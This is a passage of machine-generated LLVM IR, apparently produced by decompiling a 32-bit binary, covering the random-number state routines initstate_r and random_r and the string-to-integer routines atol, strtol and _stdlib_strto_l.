  %stack_var_-40 = alloca i64, align 8
  %v0_8050f1c = load i32, i32* @ebp, align 4
  %v0_8050f1d = load i32, i32* @edi, align 4
  %v0_8050f1e = load i32, i32* @esi, align 4
  %v0_8050f1f = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_8050f2a = trunc i64 %arg1 to i32
  store i32 %v4_8050f2a, i32* %eax.global-to-local, align 4
  %v1_8050f2e = add i32 %arg2, 12
  %v2_8050f2e = inttoptr i32 %v1_8050f2e to i32*
  %v3_8050f2e = load i32, i32* %v2_8050f2e, align 4
  store i32 %v3_8050f2e, i32* %edx.global-to-local, align 4
  %v6_8050f34 = icmp ugt i32 %v3_8050f2e, 4
  br i1 %v6_8050f34, label %dec_label_pc_8050fa8, label %dec_label_pc_8050f36

dec_label_pc_8050f36:                             ; preds = %entry
  %v1_8050f36 = add i32 %arg2, 8
  %v2_8050f36 = inttoptr i32 %v1_8050f36 to i32*
  %v3_8050f36 = load i32, i32* %v2_8050f36, align 4
  store i32 %v3_8050f36, i32* %ebx.global-to-local, align 4
  %v1_8050f39 = icmp eq i32 %v4_8050f2a, 0
  %v1_8050f3b = icmp eq i1 %v1_8050f39, false
  br i1 %v1_8050f3b, label %dec_label_pc_8050f3f, label %dec_label_pc_8050f3d

dec_label_pc_8050f3d:                             ; preds = %dec_label_pc_8050f36
  %v1_8050f3d = and i32 %v4_8050f2a, -256
  %v2_8050f3d = or i32 %v1_8050f3d, 1
  store i32 %v2_8050f3d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f3f

dec_label_pc_8050f3f:                             ; preds = %dec_label_pc_8050f36, %dec_label_pc_8050f3d
  %v0_8050f3f = phi i32 [ %v4_8050f2a, %dec_label_pc_8050f36 ], [ %v2_8050f3d, %dec_label_pc_8050f3d ]
  %v2_8050f3f = inttoptr i32 %v3_8050f36 to i32*
  store i32 %v0_8050f3f, i32* %v2_8050f3f, align 4
  %v1_8050f41 = icmp eq i32 %v3_8050f2e, 0
  br i1 %v1_8050f41, label %dec_label_pc_8050fa6, label %dec_label_pc_8050f45

dec_label_pc_8050f45:                             ; preds = %dec_label_pc_8050f3f
  %v0_8050f45 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050f45, i32* %edx.global-to-local, align 4
  %v0_8050f47 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050f47, i32* %ecx.global-to-local, align 4
  %v0_8050f49 = load i32, i32* @esi, align 4
  %v1_8050f49 = add i32 %v0_8050f49, 16
  %v2_8050f49 = inttoptr i32 %v1_8050f49 to i32*
  %v3_8050f49 = load i32, i32* %v2_8050f49, align 4
  store i32 %v3_8050f49, i32* %eax.global-to-local, align 4
  %v4_8050f51 = sext i32 %v3_8050f49 to i64
  store i64 %v4_8050f51, i64* %stack_var_-40, align 8
  %v5_8050f8327 = icmp sgt i32 %v3_8050f49, 1
  br i1 %v5_8050f8327, label %dec_label_pc_8050f56, label %dec_label_pc_8050f85

dec_label_pc_8050f56:                             ; preds = %dec_label_pc_8050f45, %dec_label_pc_8050f56.dec_label_pc_8050f56_crit_edge
  %v0_8050f7a = phi i32 [ %v0_8050f7a.pre, %dec_label_pc_8050f56.dec_label_pc_8050f56_crit_edge ], [ %v0_8050f47, %dec_label_pc_8050f45 ]
  %v0_8050f56 = phi i32 [ %v0_8050f56.pre, %dec_label_pc_8050f56.dec_label_pc_8050f56_crit_edge ], [ %v0_8050f45, %dec_label_pc_8050f45 ]
  %v0_8050f7d28 = phi i32 [ %v0_8050f80.pre, %dec_label_pc_8050f56.dec_label_pc_8050f56_crit_edge ], [ 1, %dec_label_pc_8050f45 ]
  %v1_8050f5d = ashr i32 %v0_8050f56, 31
  %v2_8050f5e = zext i32 %v0_8050f56 to i64
  %v4_8050f5e = zext i32 %v1_8050f5d to i64
  %v5_8050f5e = mul nuw i64 %v4_8050f5e, 4294967296
  %v6_8050f5e = or i64 %v5_8050f5e, %v2_8050f5e
  %v8_8050f5e = sdiv i64 %v6_8050f5e, 127773
  %v9_8050f5e = trunc i64 %v8_8050f5e to i32
  %v10_8050f5e = srem i64 %v6_8050f5e, 127773
  %v3_8050f64 = mul nsw i64 %v10_8050f5e, 16807
  %v4_8050f64 = trunc i64 %v3_8050f64 to i32
  %v3_8050f6a = mul i32 %v9_8050f5e, 2836
  store i32 %v3_8050f6a, i32* %eax.global-to-local, align 4
  %v2_8050f70 = sub i32 %v4_8050f64, %v3_8050f6a
  %v13_8050f70 = icmp slt i32 %v2_8050f70, 0
  %v1_8050f72 = icmp eq i1 %v13_8050f70, false
  %v1_8050f74 = add i32 %v2_8050f70, 2147483647
  %v2_8050f70.v1_8050f74 = select i1 %v1_8050f72, i32 %v2_8050f70, i32 %v1_8050f74
  store i32 %v2_8050f70.v1_8050f74, i32* %edx.global-to-local, align 4
  %v1_8050f7a = add i32 %v0_8050f7a, 4
  store i32 %v1_8050f7a, i32* %ecx.global-to-local, align 4
  %v1_8050f7d = add i32 %v0_8050f7d28, 1
  store i32 %v1_8050f7d, i32* @edi, align 4
  %v2_8050f7e = inttoptr i32 %v1_8050f7a to i32*
  store i32 %v2_8050f70.v1_8050f74, i32* %v2_8050f7e, align 4
  %v0_8050f80.pre = load i32, i32* @edi, align 4
  %v3_8050f80.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_8050f80.pre to i32
  %v5_8050f83 = icmp slt i32 %v0_8050f80.pre, %extract.t12
  br i1 %v5_8050f83, label %dec_label_pc_8050f56.dec_label_pc_8050f56_crit_edge, label %dec_label_pc_8050f80.dec_label_pc_8050f85_crit_edge

dec_label_pc_8050f56.dec_label_pc_8050f56_crit_edge: ; preds = %dec_label_pc_8050f56
  %v0_8050f56.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_8050f7a.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050f56

dec_label_pc_8050f80.dec_label_pc_8050f85_crit_edge: ; preds = %dec_label_pc_8050f56
  %v0_8050f85.pre = load i32, i32* @esi, align 4
  %v0_8050f88.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050f85

dec_label_pc_8050f85:                             ; preds = %dec_label_pc_8050f80.dec_label_pc_8050f85_crit_edge, %dec_label_pc_8050f45
  %v0_8050f88 = phi i32 [ %v0_8050f88.pre, %dec_label_pc_8050f80.dec_label_pc_8050f85_crit_edge ], [ %v0_8050f47, %dec_label_pc_8050f45 ]
  %v0_8050f85 = phi i32 [ %v0_8050f85.pre, %dec_label_pc_8050f80.dec_label_pc_8050f85_crit_edge ], [ %v0_8050f49, %dec_label_pc_8050f45 ]
  %v1_8050f85 = add i32 %v0_8050f85, 20
  %v2_8050f85 = inttoptr i32 %v1_8050f85 to i32*
  %v3_8050f85 = load i32, i32* %v2_8050f85, align 4
  store i32 %v3_8050f85, i32* %eax.global-to-local, align 4
  %v2_8050f88 = add i32 %v0_8050f85, 4
  %v3_8050f88 = inttoptr i32 %v2_8050f88 to i32*
  store i32 %v0_8050f88, i32* %v3_8050f88, align 4
  %v0_8050f8b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050f8b = load i32, i32* %eax.global-to-local, align 4
  %v2_8050f8b = mul i32 %v1_8050f8b, 4
  %v3_8050f8b = add i32 %v2_8050f8b, %v0_8050f8b
  store i32 %v3_8050f8b, i32* %eax.global-to-local, align 4
  %v1_8050f8e = load i32, i32* @esi, align 4
  %v2_8050f8e = inttoptr i32 %v1_8050f8e to i32*
  store i32 %v3_8050f8b, i32* %v2_8050f8e, align 4
  %v3_8050f90 = load i64, i64* %stack_var_-40, align 8
  %v6_8050f90 = mul nsw i64 %v3_8050f90, 10
  %v7_8050f90 = trunc i64 %v6_8050f90 to i32
  %v2_8050f96 = ptrtoint i32* %stack_var_-20 to i32
  %v1_8050fa324 = add i32 %v7_8050f90, -1
  %v9_8050fa325 = icmp slt i32 %v1_8050fa324, 0
  store i32 %v1_8050fa324, i32* @ebx, align 4
  %v1_8050fa426 = icmp eq i1 %v9_8050fa325, false
  br i1 %v1_8050fa426, label %dec_label_pc_8050f96, label %dec_label_pc_8050fa6

dec_label_pc_8050f96:                             ; preds = %dec_label_pc_8050f85, %dec_label_pc_8050f96
  store i32 %v2_8050f96, i32* %eax.global-to-local, align 4
  %v0_8050f9b = load i32, i32* @esi, align 4
  %v2_8050f9c = inttoptr i32 %v0_8050f9b to i32*
  %v3_8050f9c = call i32 @__GI_random_r(i32* %v2_8050f9c, i32 %v2_8050f96)
  store i32 %v0_8050f9b, i32* %eax.global-to-local, align 4
  store i32 %v2_8050f96, i32* %edx.global-to-local, align 4
  %v0_8050fa3.pre = load i32, i32* @ebx, align 4
  %v1_8050fa3 = add i32 %v0_8050fa3.pre, -1
  %v9_8050fa3 = icmp slt i32 %v1_8050fa3, 0
  store i32 %v1_8050fa3, i32* @ebx, align 4
  %v1_8050fa4 = icmp eq i1 %v9_8050fa3, false
  br i1 %v1_8050fa4, label %dec_label_pc_8050f96, label %dec_label_pc_8050fa6

dec_label_pc_8050fa6:                             ; preds = %dec_label_pc_8050f85, %dec_label_pc_8050f96, %dec_label_pc_8050f3f
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050fa8

dec_label_pc_8050fa8:                             ; preds = %entry, %dec_label_pc_8050fa6
  %v0_8050fab = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8050fa6 ]
  store i32 %v0_8050fab, i32* %eax.global-to-local, align 4
  store i32 %v0_8050f1f, i32* @ebx, align 4
  store i32 %v0_8050f1e, i32* @esi, align 4
  store i32 %v0_8050f1d, i32* @edi, align 4
  store i32 %v0_8050f1c, i32* @ebp, align 4
  ret i32 %v0_8050fab

; uselistorder directives
  uselistorder i32 %v0_8050fab, { 1, 0 }
  uselistorder i32 %v1_8050fa3, { 1, 0 }
  uselistorder i32 %v0_8050f85, { 1, 0 }
  uselistorder i32 %v0_8050f80.pre, { 1, 0 }
  uselistorder i32 %v2_8050f70.v1_8050f74, { 1, 0 }
  uselistorder i32 %v0_8050f56, { 1, 0 }
  uselistorder i32 %v0_8050f47, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050fa8, { 1, 0 }
  uselistorder label %dec_label_pc_8050fa6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050f96, { 1, 0 }
  uselistorder label %dec_label_pc_8050f56, { 1, 0 }
  uselistorder label %dec_label_pc_8050f3f, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8050fb5 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_8050fd6, label %dec_label_pc_8050fca

dec_label_pc_8050fca:                             ; preds = %entry
  %v2_8050fca = icmp ult i32 %arg3, 256
  %v1_8050fd1 = select i1 %v2_8050fca, i32 5, i32 4
  store i32 %v1_8050fd1, i32* @ebx, align 4
  br label %dec_label_pc_8050fec

dec_label_pc_8050fd6:                             ; preds = %entry
  %v6_8050fd9 = icmp ugt i32 %arg3, 31
  br i1 %v6_8050fd9, label %dec_label_pc_8050fe4, label %dec_label_pc_8050fdb

dec_label_pc_8050fdb:                             ; preds = %dec_label_pc_8050fd6
  store i32 0, i32* @ebx, align 4
  %v6_8050fe0 = icmp ugt i32 %arg3, 7
  br i1 %v6_8050fe0, label %dec_label_pc_8050fec, label %dec_label_pc_805103c

dec_label_pc_8050fe4:                             ; preds = %dec_label_pc_8050fd6
  %v2_8050fe4 = icmp ult i32 %arg3, 64
  %v1_8050fe9 = select i1 %v2_8050fe4, i32 3, i32 2
  store i32 %v1_8050fe9, i32* @ebx, align 4
  br label %dec_label_pc_8050fec

dec_label_pc_8050fec:                             ; preds = %dec_label_pc_8050fdb, %dec_label_pc_8050fca, %dec_label_pc_8050fe4
  %v0_8050fec = phi i32 [ 0, %dec_label_pc_8050fdb ], [ %v1_8050fd1, %dec_label_pc_8050fca ], [ %v1_8050fe9, %dec_label_pc_8050fe4 ]
  %v1_8050fec = mul nuw nsw i32 %v0_8050fec, 4
  %v2_8050fec = add i32 %v1_8050fec, ptrtoint (i32* @global_var_8057a34.252 to i32)
  %v3_8050fec = inttoptr i32 %v2_8050fec to i32*
  %v4_8050fec = load i32, i32* %v3_8050fec, align 4
  store i32 %v4_8050fec, i32* %eax.global-to-local, align 4
  %v1_8050ff3 = add i32 %tmp7, 4
  store i32 %v1_8050ff3, i32* @esi, align 4
  %v2_8050ff6 = add i32 %arg4, 16
  %v3_8050ff6 = inttoptr i32 %v2_8050ff6 to i32*
  store i32 %v4_8050fec, i32* %v3_8050ff6, align 4
  %v0_8050ff9 = load i32, i32* @ebx, align 4
  %v1_8050ff9 = mul i32 %v0_8050ff9, 4
  %v2_8050ff9 = add i32 %v1_8050ff9, ptrtoint (i32* @global_var_8057a20.253 to i32)
  %v3_8050ff9 = inttoptr i32 %v2_8050ff9 to i32*
  %v4_8050ff9 = load i32, i32* %v3_8050ff9, align 4
  store i32 %v4_8050ff9, i32* %edx.global-to-local, align 4
  %v0_8051000 = load i32, i32* @esi, align 4
  %v1_8051000 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051000 = mul i32 %v1_8051000, 4
  %v3_8051000 = add i32 %v2_8051000, %v0_8051000
  store i32 %v3_8051000, i32* %eax.global-to-local, align 4
  %v1_8051003 = load i32, i32* @edi, align 4
  %v2_8051003 = add i32 %v1_8051003, 12
  %v3_8051003 = inttoptr i32 %v2_8051003 to i32*
  store i32 %v0_8050ff9, i32* %v3_8051003, align 4
  %v0_8051006 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051006 = load i32, i32* @edi, align 4
  %v2_8051006 = add i32 %v1_8051006, 20
  %v3_8051006 = inttoptr i32 %v2_8051006 to i32*
  store i32 %v0_8051006, i32* %v3_8051006, align 4
  %v0_8051009 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051009 = load i32, i32* @edi, align 4
  %v2_8051009 = add i32 %v1_8051009, 24
  %v3_8051009 = inttoptr i32 %v2_8051009 to i32*
  store i32 %v0_8051009, i32* %v3_8051009, align 4
  %v0_805100c = load i32, i32* @esi, align 4
  %v1_805100c = load i32, i32* @edi, align 4
  %v2_805100c = add i32 %v1_805100c, 8
  %v3_805100c = inttoptr i32 %v2_805100c to i32*
  store i32 %v0_805100c, i32* %v3_805100c, align 4
  %v0_805100f = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8051014 = sext i32 %arg1 to i64
  %v3_8051014 = call i32 @srandom_r(i64 %v2_8051014, i32 %v0_805100f)
  %v0_8051019 = load i32, i32* @ebp, align 4
  %v1_8051019 = inttoptr i32 %v0_8051019 to i32*
  store i32 0, i32* %v1_8051019, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051024 = load i32, i32* @ebx, align 4
  %v1_8051024 = icmp eq i32 %v0_8051024, 0
  br i1 %v1_8051024, label %dec_label_pc_8051055, label %dec_label_pc_8051028

dec_label_pc_8051028:                             ; preds = %dec_label_pc_8050fec
  %v0_8051028 = load i32, i32* @edi, align 4
  %v1_8051028 = add i32 %v0_8051028, 4
  %v2_8051028 = inttoptr i32 %v1_8051028 to i32*
  %v3_8051028 = load i32, i32* %v2_8051028, align 4
  %v1_805102b = load i32, i32* @esi, align 4
  %v2_805102b = sub i32 %v3_8051028, %v1_805102b
  %v2_805102d = sdiv i32 %v2_805102b, 4
  %v3_8051030 = mul i32 %v2_805102d, 5
  %v2_8051033 = add i32 %v3_8051030, %v0_8051024
  %v1_8051035 = load i32, i32* @ebp, align 4
  %v2_8051035 = inttoptr i32 %v1_8051035 to i32*
  store i32 %v2_8051033, i32* %v2_8051035, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051055

dec_label_pc_805103c:                             ; preds = %dec_label_pc_8050fdb
  %v1_805103c = call i32 @__errno_location(i32 %v0_8050fb5)
  store i32 %v1_805103c, i32* %eax.global-to-local, align 4
  %v1_8051041 = inttoptr i32 %v1_805103c to i32*
  store i32 22, i32* %v1_8051041, align 4
  %v0_8051047 = load i32, i32* %stack_var_-36, align 4
  %v1_8051047 = call i32 @__errno_location(i32 %v0_8051047)
  %v1_805104c = inttoptr i32 %v1_8051047 to i32*
  store i32 22, i32* %v1_805104c, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051055

dec_label_pc_8051055:                             ; preds = %dec_label_pc_8050fec, %dec_label_pc_8051028, %dec_label_pc_805103c
  %v0_805105c = phi i32 [ 0, %dec_label_pc_8050fec ], [ 0, %dec_label_pc_8051028 ], [ -1, %dec_label_pc_805103c ]
  ret i32 %v0_805105c

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051055, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050fec, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805106b = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_805106b
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8051085 = inttoptr i32 %arg1 to i8*
  %v5_8051085 = call i32 @_stdlib_strto_l(i8* %v4_8051085, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8051085
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_8051093 = load i32, i32* @ebx, align 4
  store i32 %v0_8051093, i32* %stack_var_-16, align 4
  %v0_8051097 = load i32, i32* @global_var_8059858, align 8
  %v4_805109d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805109d, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_805109d, i32* %ebx.global-to-local, align 4
  %v2_80510aa41 = load i8, i8* %arg1, align 1
  %v3_80510aa42 = sext i8 %v2_80510aa41 to i32
  store i32 %v3_80510aa42, i32* %eax.global-to-local, align 4
  %v2_80510ad43 = mul nsw i32 %v3_80510aa42, 2
  %v3_80510ad44 = add i32 %v2_80510ad43, %v0_8051097
  %v4_80510ad45 = inttoptr i32 %v3_80510ad44 to i8*
  %v5_80510ad46 = load i8, i8* %v4_80510ad45, align 1
  %v6_80510ad47 = and i8 %v5_80510ad46, 32
  %v7_80510ad48 = icmp eq i8 %v6_80510ad47, 0
  %v1_80510b149 = icmp eq i1 %v7_80510ad48, false
  br i1 %v1_80510b149, label %dec_label_pc_80510a9, label %dec_label_pc_80510b3

dec_label_pc_80510a9:                             ; preds = %entry, %dec_label_pc_80510a9
  %v0_80510a950 = phi i32 [ %v1_80510a9, %dec_label_pc_80510a9 ], [ %v4_805109d, %entry ]
  %v1_80510a9 = add i32 %v0_80510a950, 1
  store i32 %v1_80510a9, i32* %ebx.global-to-local, align 4
  %v1_80510aa = inttoptr i32 %v1_80510a9 to i8*
  %v2_80510aa = load i8, i8* %v1_80510aa, align 1
  %v3_80510aa = sext i8 %v2_80510aa to i32
  store i32 %v3_80510aa, i32* %eax.global-to-local, align 4
  %v2_80510ad = mul nsw i32 %v3_80510aa, 2
  %v3_80510ad = add i32 %v2_80510ad, %v0_8051097
  %v4_80510ad = inttoptr i32 %v3_80510ad to i8*
  %v5_80510ad = load i8, i8* %v4_80510ad, align 1
  %v6_80510ad = and i8 %v5_80510ad, 32
  %v7_80510ad = icmp eq i8 %v6_80510ad, 0
  %v1_80510b1 = icmp eq i1 %v7_80510ad, false
  br i1 %v1_80510b1, label %dec_label_pc_80510a9, label %dec_label_pc_80510b3

dec_label_pc_80510b3:                             ; preds = %dec_label_pc_80510a9, %entry
  %v0_80510a9.lcssa = phi i32 [ %v4_805109d, %entry ], [ %v1_80510a9, %dec_label_pc_80510a9 ]
  %v2_80510aa.lcssa = phi i8 [ %v2_80510aa41, %entry ], [ %v2_80510aa, %dec_label_pc_80510a9 ]
  %v3_80510aa.lcssa = phi i32 [ %v3_80510aa42, %entry ], [ %v3_80510aa, %dec_label_pc_80510a9 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_80510b3 = icmp eq i8 %v2_80510aa.lcssa, 43
  br i1 %v9_80510b3, label %dec_label_pc_80510c8, label %dec_label_pc_80510b8

dec_label_pc_80510b8:                             ; preds = %dec_label_pc_80510b3
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_80510ba = icmp eq i8 %v2_80510aa.lcssa, 45
  %v1_80510bd = icmp eq i1 %v9_80510ba, false
  br i1 %v1_80510bd, label %dec_label_pc_80510c9, label %dec_label_pc_80510c8

dec_label_pc_80510c8:                             ; preds = %dec_label_pc_80510b3, %dec_label_pc_80510b8
  %storemerge3 = phi i32 [ 1, %dec_label_pc_80510b8 ], [ 0, %dec_label_pc_80510b3 ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_80510c8 = add i32 %v0_80510a9.lcssa, 1
  store i32 %v1_80510c8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80510c9

dec_label_pc_80510c9:                             ; preds = %dec_label_pc_80510b8, %dec_label_pc_80510c8
  %v0_80510db = phi i32 [ %v0_80510a9.lcssa, %dec_label_pc_80510b8 ], [ %v1_80510c8, %dec_label_pc_80510c8 ]
  %v1_80510cb = and i32 %arg3, -17
  %v2_80510cb = icmp eq i32 %v1_80510cb, 0
  %v1_80510d1 = icmp eq i1 %v2_80510cb, false
  br i1 %v1_80510d1, label %dec_label_pc_80510f7, label %dec_label_pc_80510d3

dec_label_pc_80510d3:                             ; preds = %dec_label_pc_80510c9
  %v1_80510d3 = add i32 %arg3, 10
  store i32 %v1_80510d3, i32* %esi.global-to-local, align 4
  %v1_80510d6 = inttoptr i32 %v0_80510db to i8*
  %v2_80510d6 = load i8, i8* %v1_80510d6, align 1
  %v8_80510d6 = icmp eq i8 %v2_80510d6, 48
  %v1_80510d9 = icmp eq i1 %v8_80510d6, false
  br i1 %v1_80510d9, label %dec_label_pc_80510ed, label %dec_label_pc_80510db

dec_label_pc_80510db:                             ; preds = %dec_label_pc_80510d3
  %v1_80510db = add i32 %v0_80510db, 1
  store i32 %v1_80510db, i32* %ebx.global-to-local, align 4
  %v1_80510dc = add i32 %arg3, 8
  store i32 %v1_80510dc, i32* %esi.global-to-local, align 4
  %v1_80510e1 = inttoptr i32 %v1_80510db to i8*
  %v2_80510e1 = load i8, i8* %v1_80510e1, align 1
  %v3_80510e1 = zext i8 %v2_80510e1 to i32
  %v5_80510e1 = and i32 %v3_80510aa.lcssa, -256
  %v6_80510e1 = or i32 %v5_80510e1, %v3_80510e1
  %v1_80510e3 = or i32 %v6_80510e1, 32
  %v3_80510e3 = trunc i32 %v1_80510e3 to i8
  store i32 %v1_80510e3, i32* %eax.global-to-local, align 4
  %v10_80510e6 = icmp eq i8 %v3_80510e3, 120
  %v1_80510e8 = icmp eq i1 %v10_80510e6, false
  br i1 %v1_80510e8, label %dec_label_pc_80510ed, label %dec_label_pc_80510ea

dec_label_pc_80510ea:                             ; preds = %dec_label_pc_80510db
  %v2_80510ea = mul i32 %v1_80510dc, 2
  store i32 %v2_80510ea, i32* %esi.global-to-local, align 4
  %v1_80510ec = add i32 %v0_80510db, 2
  store i32 %v1_80510ec, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80510ed

dec_label_pc_80510ed:                             ; preds = %dec_label_pc_80510db, %dec_label_pc_80510d3, %dec_label_pc_80510ea
  %v0_805111612 = phi i32 [ %v1_80510db, %dec_label_pc_80510db ], [ %v0_80510db, %dec_label_pc_80510d3 ], [ %v1_80510ec, %dec_label_pc_80510ea ]
  %v0_805116d20 = phi i32 [ %v1_80510db, %dec_label_pc_80510db ], [ %v4_805109d, %dec_label_pc_80510d3 ], [ %v1_80510db, %dec_label_pc_80510ea ]
  %v0_80510ed = phi i32 [ %v1_80510dc, %dec_label_pc_80510db ], [ %v1_80510d3, %dec_label_pc_80510d3 ], [ %v2_80510ea, %dec_label_pc_80510ea ]
  %v7_80510f0 = icmp sgt i32 %v0_80510ed, 16
  br i1 %v7_80510f0, label %dec_label_pc_80510f2, label %dec_label_pc_80510f7

dec_label_pc_80510f2:                             ; preds = %dec_label_pc_80510ed
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80510f7

dec_label_pc_80510f7:                             ; preds = %dec_label_pc_80510ed, %dec_label_pc_80510c9, %dec_label_pc_80510f2
  %v0_805116d21 = phi i32 [ %v0_805116d20, %dec_label_pc_80510ed ], [ %v4_805109d, %dec_label_pc_80510c9 ], [ %v0_805116d20, %dec_label_pc_80510f2 ]
  %v0_805111613 = phi i32 [ %v0_805111612, %dec_label_pc_80510ed ], [ %v0_80510db, %dec_label_pc_80510c9 ], [ %v0_805111612, %dec_label_pc_80510f2 ]
  %v0_8051106 = phi i32 [ %v0_80510ed, %dec_label_pc_80510ed ], [ %arg3, %dec_label_pc_80510c9 ], [ 16, %dec_label_pc_80510f2 ]
  %v1_80510f7 = add i32 %v0_8051106, -2
  store i32 %v1_80510f7, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_80510ff = icmp ugt i32 %v1_80510f7, 34
  br i1 %v6_80510ff, label %dec_label_pc_8051162, label %dec_label_pc_8051101

dec_label_pc_8051101:                             ; preds = %dec_label_pc_80510f7
  %div = udiv i32 -1, %v0_8051106
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_8051106
  %v1_8051108 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_8051142 = urem i32 %arg4, 256
  br label %dec_label_pc_8051116

dec_label_pc_8051114:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051142
  %v4_8051116.pre = phi i32 [ %v1_805112c, %dec_label_pc_8051158 ], [ %v4_8051116.pre.pre, %dec_label_pc_8051142 ]
  %v0_8051114 = phi i32 [ %v1_8051133, %dec_label_pc_8051158 ], [ %v0_8051114.pre, %dec_label_pc_8051142 ]
  br label %dec_label_pc_8051116

dec_label_pc_8051116:                             ; preds = %dec_label_pc_8051101, %dec_label_pc_8051114
  %v0_805116d19 = phi i32 [ %v0_805116d21, %dec_label_pc_8051101 ], [ %v0_8051114, %dec_label_pc_8051114 ]
  %v0_8051133 = phi i32 [ %v0_805111613, %dec_label_pc_8051101 ], [ %v0_8051114, %dec_label_pc_8051114 ]
  %v4_8051116 = phi i32 [ %div, %dec_label_pc_8051101 ], [ %v4_8051116.pre, %dec_label_pc_8051114 ]
  %v1_8051116 = inttoptr i32 %v0_8051133 to i8*
  %v2_8051116 = load i8, i8* %v1_8051116, align 1
  %v3_8051116 = zext i8 %v2_8051116 to i32
  %v5_8051116 = and i32 %v4_8051116, -256
  %v6_8051116 = or i32 %v3_8051116, %v5_8051116
  store i32 %v6_8051116, i32* %eax.global-to-local, align 4
  %v1_8051118 = add i32 %v6_8051116, -48
  store i32 %v1_8051118, i32* @ecx, align 4
  %v1_805111b = trunc i32 %v1_8051118 to i8
  %tmp55 = icmp ult i8 %v1_805111b, 10
  br i1 %tmp55, label %dec_label_pc_805112c, label %dec_label_pc_8051120

dec_label_pc_8051120:                             ; preds = %dec_label_pc_8051116
  %v1_8051120 = or i32 %v6_8051116, 32
  %v3_8051120 = trunc i32 %v1_8051120 to i8
  store i32 %v1_8051120, i32* %eax.global-to-local, align 4
  %v1_8051123 = and i32 %v1_8051118, -256
  %v2_8051123 = or i32 %v1_8051123, 40
  store i32 %v2_8051123, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_8051120, 97
  br i1 %tmp56, label %dec_label_pc_805112c, label %dec_label_pc_8051129

dec_label_pc_8051129:                             ; preds = %dec_label_pc_8051120
  %v1_8051129 = add i32 %v1_8051120, -87
  store i32 %v1_8051129, i32* @ecx, align 4
  br label %dec_label_pc_805112c

dec_label_pc_805112c:                             ; preds = %dec_label_pc_8051120, %dec_label_pc_8051116, %dec_label_pc_8051129
  %v0_805115b = phi i32 [ %v2_8051123, %dec_label_pc_8051120 ], [ %v1_8051118, %dec_label_pc_8051116 ], [ %v1_8051129, %dec_label_pc_8051129 ]
  %v1_805112c = urem i32 %v0_805115b, 256
  store i32 %v1_805112c, i32* %eax.global-to-local, align 4
  %v1_805112f = load i32, i32* %esi.global-to-local, align 4
  %v2_805112f = sub i32 %v1_805112c, %v1_805112f
  %v10_805112f = and i32 %v2_805112f, %v1_805112f
  %v11_805112f = icmp slt i32 %v10_805112f, 0
